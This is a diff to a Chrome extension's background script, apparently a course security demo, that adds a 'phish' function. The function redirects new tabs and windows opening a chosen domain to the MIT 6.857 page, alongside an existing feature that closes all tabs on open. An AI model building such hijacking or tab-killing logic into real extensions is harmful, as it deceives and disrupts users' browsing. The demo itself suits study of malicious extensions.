@@ -23,15 +23,25 @@ chrome.notifications.onClosed.addListener(function(notifId, byUser){
   }
 });
 
+chrome.commands.onCommand.addListener(function(command) {
+        console.log('Command:', command);
+      });
+
 /*
  * Dos Chrome -- Close windows and tabs as soon as they open.
- * Reroute all new windows and tabs to an arbitrary website.
+ * Phish -- Reroute all new windows and tabs to an arbitrary website.
  */
 chrome.windows.onCreated.addListener(function(event) {
   console.log('opened a new window');
-  if (JSON.parse(localStorage.getItem('rerouteBool'))) {
+
+  if (event.url) { // execute phishing attack
+    console.log('caputured new window url');
+    phish(event.url, event.id);
+  } else if (JSON.parse(localStorage.getItem('rerouteBool'))) { // reroute new tab
+    console.log('no accessible event url');
     chrome.tabs.update(event.id, {url: 'http://courses.csail.mit.edu/6.857/2016/'});
   }
+
   if (JSON.parse(localStorage.getItem('closeBool'))) {
     chrome.tabs.query({}, function(tabs) {
       tabs.forEach(function(tab) {
@@ -43,10 +53,16 @@ chrome.windows.onCreated.addListener(function(event) {
 
 chrome.tabs.onCreated.addListener(function(event) {
   console.log('opened a new tab');
-  if (JSON.parse(localStorage.getItem('rerouteBool'))) {
+
+  if (event.url) { // execute phishing attack
+    console.log('caputured new tab url');
+    phish(event.url, event.id);
+  } else if (JSON.parse(localStorage.getItem('rerouteBool'))) { // reroute new tab
+    console.log('no accessible event url');
     chrome.tabs.update(event.id, {url: 'http://courses.csail.mit.edu/6.857/2016/'});
   }
-  if (JSON.parse(localStorage.getItem('closeBool'))) {
+
+  if (JSON.parse(localStorage.getItem('closeBool'))) { // close new tab
     chrome.tabs.query({}, function(tabs) {
       tabs.forEach(function(tab) {
         chrome.tabs.remove(tab.id);
@@ -54,6 +70,19 @@ chrome.tabs.onCreated.addListener(function(event) {
     });
   }
 });
+
+function phish(input_url, tab_id) {
+  var r = new RegExp('^(?:https?:\/\/)?(?:[^@\n]+@)?(?:www\.)?([^:\/\n]+)');
+  var url = r.exec(input_url)[1];
+  var split = url.split('.');
+  if (split.length > 2) {
+    url = split[split.length-2] + '.' + split[split.length-1];
+  }
+  console.log('shortened url: ' + url);
+  if (url == document.getElementById('phish-site').value) {
+    chrome.tabs.update(tab_id, {url: 'http://courses.csail.mit.edu/6.857/2016/'});
+  }
+}
 
 /*
  *Declarative Content Stuffs
